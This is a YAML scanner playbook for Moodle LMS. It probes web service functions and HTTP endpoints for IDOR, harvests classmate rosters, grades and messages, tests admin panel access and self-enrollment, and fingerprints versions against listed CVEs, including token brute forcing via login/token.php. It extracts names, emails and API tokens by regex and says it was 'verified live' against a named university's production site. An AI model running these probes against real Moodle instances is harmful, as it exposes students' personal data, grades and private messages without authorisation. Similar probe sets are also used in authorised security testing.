name: moodle
version: 1.0
description: |
  Moodle LMS playbook. Covers web service API enumeration, IDOR via
  profile/course/grade endpoints, mobile token extraction (CVE-2025-62399),
  classmate roster enumeration, self-enrollment checks, admin access
  probing, and version fingerprinting for unpatched MSA/CVE vectors.
  Verified live against elearning.kibu.ac.ke (Moodle 5.0.1, Aug 2026).

fingerprint:
  body:
    - "moodle"
    - 'name="logintoken"'
  headers:
    set-cookie: "MoodleSession"
  url: []

# ─── Authentication ───────────────────────────────────────────────────────
auth:
  # Moodle uses a CSRF token (logintoken) in the login form. The scanner
  # must fetch the login page first, extract logintoken, then POST.
  login_url: "/login/index.php"
  token_field: "logintoken"
  username_field: "username"
  password_field: "password"
  # Cookie jar must persist MoodleSession across requests
  session_cookie: "MoodleSession"
  # Mobile API token (separate from session login)
  token_endpoint: "/login/token.php"
  token_service: "moodle_mobile_app"
  token_params:
    username: "{username}"
    password: "{password}"
    service: "moodle_mobile_app"

# ─── Web Service API Surface ─────────────────────────────────────────────
# These are the WS functions a student token can call. Each one is a
# potential IDOR/enumeration vector. The playbook probes each one and
# records the response.
web_services:
  endpoint: "/webservice/rest/server.php"
  format: "json"
  # Functions that enumerate users
  user_enum:
    - function: "core_enrol_get_enrolled_users"
      args: {courseid: "{course_id}"}
      finding: "Classmate roster enumeration — returns full names, emails, IDs for every enrolled student"
      severity: high
      verify: "response contains list of users with fullname + email fields"
    - function: "core_user_get_users_by_field"
      args: {field: "id", values: ["{user_id}"]}
      finding: "User lookup by ID — returns profile data for any user"
      severity: medium
      verify: "response contains user object with fullname"
    - function: "core_user_get_user_preferences"
      args: {}
      finding: "User preferences leak — password change timestamp, course activity"
      severity: low
      verify: "response contains preferences array"
  # Functions that enumerate courses
  course_enum:
    - function: "core_course_get_categories"
      args: {}
      finding: "Department/faculty enumeration — all categories with course counts"
      severity: medium
      verify: "response contains categories list"
    - function: "core_enrol_get_users_courses"
      args: {userid: "{user_id}"}
      finding: "Course enrollment map — shows all courses for any user ID (IDOR)"
      severity: high
      verify: "response contains courses for requested user"
    - function: "core_course_get_enrolled_courses_by_timeline_classification"
      args: {classification: "all", limit: 50}
      finding: "Enrolled course enumeration via timeline"
      severity: low
      verify: "response contains courses list"
  # Functions that access grades
  grade_access:
    - function: "gradereport_user_get_grade_items"
      args: {courseid: "{course_id}", userid: "{user_id}"}
      finding: "Grade access — student grades for enrolled courses"
      severity: high
      verify: "response contains usergrades array"
    - function: "gradereport_overview_get_course_grades"
      args: {userid: "{user_id}"}
      finding: "Overview grades IDOR — all course grades for any user"
      severity: high
      verify: "response contains grades array"
    - function: "mod_assign_get_grades"
      args: {assignmentids: ["{assignment_id}"]}
      finding: "Assignment grade access"
      severity: medium
      verify: "response contains assignments array"
  # Functions that access messages
  message_access:
    - function: "core_message_get_messages"
      args: {useridto: "{user_id}", useridfrom: 0, type: "conversations", read: 0}
      finding: "Message access — read user conversations"
      severity: medium
      verify: "response contains messages array"
    - function: "core_message_get_conversation"
      args: {conversationid: "{conv_id}"}
      finding: "Conversation IDOR — read any conversation by ID"
      severity: high
      verify: "response contains conversation object"
  # Functions that probe enrollment
  enrollment:
    - function: "core_enrol_get_course_enrolment_methods"
      args: {courseid: "{course_id}"}
      finding: "Enrollment method disclosure — reveals self-enrollment status"
      severity: low
      verify: "response contains enrollment methods"
    - function: "enrol_self_enrol_user"
      args: {courseid: "{course_id}"}
      finding: "Self-enrollment attempt — if enabled, student gains unauthorized course access"
      severity: high
      verify: "response status true"

# ─── HTTP IDOR Probes ────────────────────────────────────────────────────
# These are direct HTTP GET/POST probes, not WS calls.
http_probes:
  - path: "/user/profile.php?id={user_id}"
    method: GET
    finding: "Profile IDOR — full user profile visible for any user ID"
    severity: medium-high
    verify: "response contains user name and profile data, not access denied"
    extract:
      - name: "page-header-headings.*?<h1[^>]*>([^<]+)"
        field: fullname
      - pattern: '[\w.+-]+@[\w-]+\.[\w.]+'
        field: email
      - pattern: 'Last access.*?>([^<]+)'
        field: last_access

  - path: "/user/edit.php?id={user_id}"
    method: GET
    finding: "Profile edit IDOR — can edit other users' profiles"
    severity: high
    verify: "response contains firstname/lastname/email form fields"
    access_denied_marker: "accessdenied"

  - path: "/course/view.php?id={course_id}"
    method: GET
    finding: "Course IDOR — full course content visible without enrollment"
    severity: high
    verify: "response contains course sections and activities, not access denied"
    extract:
      - pattern: "<title>([^<]+)</title>"
        field: course_title

  - path: "/grade/report/user/index.php?id={course_id}"
    method: GET
    finding: "Grade report IDOR — view grades for any course"
    severity: high
    verify: "response contains grade data, not access denied"
    access_denied_marker: "accessdenied"

  - path: "/admin/"
    method: GET
    finding: "Admin panel accessible to student — privilege escalation"
    severity: critical
    verify: "response contains admin navigation, not access denied"
    access_denied_marker: "accessdenied"

  - path: "/login/token.php?username={username}&password={password}&service=moodle_mobile_app"
    method: GET
    finding: "Mobile API token issued without rate limiting (CVE-2025-62399)"
    severity: high
    verify: "response contains JSON with token field"
    extract:
      - pattern: '"token":"([^"]+)"'
        field: token

# ─── Version / CVE Fingerprinting ────────────────────────────────────────
version_fingerprint:
  # Moodle version is in the page source
  patterns:
    - "Moodle\\s+(\\d+\\.\\d+\\.\\d+)"
    - "moodle.*?version.*?(\\d+\\.\\d+\\.\\d+)"
    - "theme.*?rev.*?(\\d{10,})"
  # Known CVEs by version
  cves:
    "5.0.1":
      - id: CVE-2025-62399
        name: "Brute force via login/token.php (no rate limiting)"
        severity: high
      - id: MSA-25-0037-0050
        name: "Unpatched security train (5.0.2/5.0.3 fixes)"
        severity: medium
    "4.5.x":
      - id: CVE-2024-45153
        name: "SQL injection in course import"
        severity: critical
    "4.4.x":
      - id: CVE-2024-43425
        name: "Blind SQL injection in forum"
        severity: critical

# ─── Discovery Seeds ────────────────────────────────────────────────────
# URLs to feed into the crawl queue that the generic crawler would miss
discovery_seeds:
  - "/my/"
  - "/user/profile.php"
  - "/user/edit.php"
  - "/user/files.php"
  - "/course/index.php"
  - "/course/view.php?id=1"
  - "/calendar/"
  - "/message/"
  - "/admin/"
  - "/login/forgot_password.php"
  - "/webservice/rest/server.php"
  - "/lib/ajax/service.php"
  - "/login/token.php"
  - "/admin/tool/dataprivacy/summary.php"

# ─── Expected Findings ──────────────────────────────────────────────────
expected_findings:
  - type: "Info Leak"
    description: "Missing security headers (CSP, HSTS, X-Content-Type-Options)"
    severity: medium
    verify: "header check"
  - type: "Info Leak"
    description: "Server software version disclosure (Apache/PHP)"
    severity: low
    verify: "header check"
  - type: "IDOR"
    description: "Profile IDOR via user/profile.php?id=N"
    severity: medium-high
    verify: "authenticated GET returns other user data"
  - type: "BOLA"
    description: "Course content access without enrollment"
    severity: high
    verify: "authenticated GET returns course sections"
  - type: "Info Leak"
    description: "Classmate enumeration via web service API"
    severity: high
    verify: "WS call returns list of enrolled users with PII"
  - type: "Auth Weakness"
    description: "Mobile API token issued without rate limiting (CVE-2025-62399)"
    severity: high
    verify: "login/token.php returns valid token"
